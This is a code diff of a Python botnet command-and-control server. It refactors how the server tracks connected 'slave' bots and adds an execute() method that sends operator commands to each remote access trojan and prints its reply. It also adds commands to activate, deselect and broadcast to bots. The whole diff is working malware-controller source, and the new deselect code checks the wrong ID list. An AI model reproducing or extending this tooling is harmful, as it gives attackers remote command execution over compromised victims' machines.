@@ -9,17 +9,16 @@ import time
 
 q = queue.Queue()
 
-AllConnections = []           # Stores all BotHandler instances
-ActiveConnections = []      # Stores all currently active BotHandler sessions
-DeadConnections = []        # Records the dead-instance's information
-ClientAddressList = {}      # Stores client_address[] info (IP, Port): IP is stored in string format, port is not
-#Sessions = []
+allConnections = []           # Stores all BotHandler instances
+activeConnections = []      # Stores all currently active BotHandler sessions
+deadConnections = []        # Records the dead-instance's information
+clientAddressList = {}      # Stores client_address[] info (IP, Port): IP is stored in string format, port is not
 
 # -------------------------------------------------------------------------------------------
 
 class BotHandler(threading.Thread):
 
-    def __init__(self, client, client_address, active, bot_id, qv):
+    def __init__(self, client, client_address, active, bot_id):
         threading.Thread.__init__(self)
         self.client = client
         self.client_address = client_address
@@ -27,7 +26,9 @@ class BotHandler(threading.Thread):
         self.port = client_address[1]
         self.isActive = active
         self.bot_id = bot_id
-        self.q = qv
+
+        # No longer using queues and instead are using specific class execute(cmd)
+        #self.q = qv            
 
         # This line returns 'MainThread'
         #self.BotName = threading.current_thread().getName()
@@ -41,32 +42,8 @@ class BotHandler(threading.Thread):
         print("[* BotHandler-Msg] Slave " + self.ip + ":" + str(self.port) + " connected with Session ID of " + str(self.bot_id))
 
         # [NIX'D] - Interesting, we can use strings (Thread-#) to index an array. Noted...
-        ClientAddressList[self.bot_id] = self.client_address
+        clientAddressList[self.bot_id] = self.client_address
         # [NIX'D] - This is a useful array in which we can access Client information (IP, Port) by thread-id
-
-        while True:
-
-            if(self.isActive):
-                RecvBotCmd = self.q.get()           # Pulls cmds from queue to be executed
-
-                print("\n[* BotHandler-Msg] Received Command: " + RecvBotCmd + " for bot " + str(self.bot_id))
-
-                try:
-                    #RecvBotCmd += "\n"
-
-                    # Send data/command to RAT
-                    self.client.send(RecvBotCmd.encode('utf-8'))
-                    recvVal = (self.client.recv(1024)).decode('utf-8')      # Receive reply from RAT
-
-                    print(recvVal)                                          # Display message received
-
-                except Exception as ex:
-                    # for t in AllConnections:
-                    #     if t.is_alive() == False:
-                    #         print("\n[!] Died Thread: " + str(t))
-                    #         t.join()
-                    print(ex)
-                    break
     
     def activate(self):
         print("\n[*BotHandler-Msg] Activating Bot " + str(self.bot_id) + "...")
@@ -88,6 +65,27 @@ class BotHandler(threading.Thread):
     def getPort(self):
         return self.port
 
+    def execute(self, command):
+
+        print("\n[* BotHandler-Msg] Received Command: " + str(command) + " for bot " + str(self.bot_id))
+
+        try:
+            #RecvBotCmd += "\n"
+
+            # Send data/command to RAT
+            self.client.send(command.encode('utf-8'))
+            recvVal = (self.client.recv(1024)).decode('utf-8')      # Receive reply from RAT
+            print(recvVal)                                          # Display message received
+
+        except Exception as ex:
+            # for t in allConnections:
+            #     if t.is_alive() == False:
+            #         print("\n[!] Died Thread: " + str(t))
+            #         t.join()
+            print("Unable to send connection to bot " + (self.bot_id) + " at " + str(self.ip))
+            print(ex)
+
+
 # -------------------------------------------------------------------------------------------
 
 class BotCmd(threading.Thread):
@@ -106,11 +104,12 @@ class BotCmd(threading.Thread):
                 pass
 
             elif (cmd == "exit"):
-                for i in range(len(AllConnections)):
+                print("[+] Sending Command: " + cmd + " to " + str(len(allConnections)) + " bots")
+                for conn in allConnections:                                         # for i in range(len(allConnections)):
                     time.sleep(0.1)
-                    self.q.put(cmd)
+                    conn.execute(cmd)
 
-                print("Exiting - Please wait...")
+                print("Exiting connection[s] for all bots Please wait...")
                 time.sleep(5)
                 os._exit(0)
 
@@ -120,43 +119,51 @@ class BotCmd(threading.Thread):
                 print("| List of Active Sessions |")
                 print("---------------------------")
 
-                for conn in ActiveConnections:
+                for conn in activeConnections:
                     print("| %3d | %20s |"% (conn.getID(), conn.getIP()))
-
-                print("-------------------------")
+                    print("-------------------------")
 
             elif (cmd == "list-all"):
-
                 print("---------------------------")
                 print("| List of All Connections |")
                 print("---------------------------")
 
-                for conn in AllConnections:
+                for conn in allConnections:
                     print("| %3d | %15s |"% (conn.getID(), conn.getIP()))
+                    print("-------------------------")
 
-                print("-------------------------")
-
-            elif (cmd == "select"):
+            elif (cmd == "set-active"):
 
                 selectedIDs = [int(n) for n in input('Enter IDs (seperated by spaces): ').split()]
                 print("ID list obtained: " + str(selectedIDs))
                 
-                for conn in AllConnections:
-                    print("Handler: ", str(conn))
+                for conn in allConnections:
+                    #print("Handler: ", str(conn))
 
                     if conn.getID() in selectedIDs:
-                        print("Activating Bot " + str(selectedIDs))
+                        print("Activating Bot " + str(conn.getID()))
                         conn.activate()
-                        ActiveConnections.append(conn)
-                    else:
-                        print("Bot not found...")
-            #elif (cmd == "deselect"):
+                        activeConnections.append(conn)
 
+                    #else:
+                    #    print("Bot %d not found in active list..."% (conn.getID()))
+
+            elif (cmd == "deselect"):
+                deselectedIDs = [int(n) for n in input('Enter IDs (seperated by spaces): ').split()]
+                print("ID list obtained: " + str(deselectedIDs))
+
+                for conn in activeConnections:
+                    #print("Handler: ", str(conn))
+
+                    if conn.getID() in selectedIDs:
+                        print("Deactivating Bot " + str(conn.getID()))
+                        conn.deactivate()
+                        activeConnections.remove(conn)
             else:
-                print("[+] Sending Command: " + cmd + " to " + str(len(AllConnections)) + " bots")
-                for i in range(len(ActiveConnections)):                                         # for i in range(len(AllConnections)):
+                print("[+] Sending Command: " + cmd + " to " + str(len(allConnections)) + " bots")
+                for conn in activeConnections:                                         # for i in range(len(allConnections)):
                     time.sleep(0.1)
-                    self.q.put(cmd)
+                    conn.execute(cmd)
 
 # --------------------------------------------------------------------------------------------------------------------------
 
@@ -181,8 +188,8 @@ def listener(lhost, lport, q):
         print("Connection received from " + str(client_address[0]))
 
         # BotHandler = Multiconn, a new BotHandler is spawned for each incoming connection
-        newConn = BotHandler(client, client_address, False, connRecord, q)
-        AllConnections.append(newConn)
+        newConn = BotHandler(client, client_address, False, connRecord)
+        allConnections.append(newConn)
         connRecord += 1
         newConn.start()
 
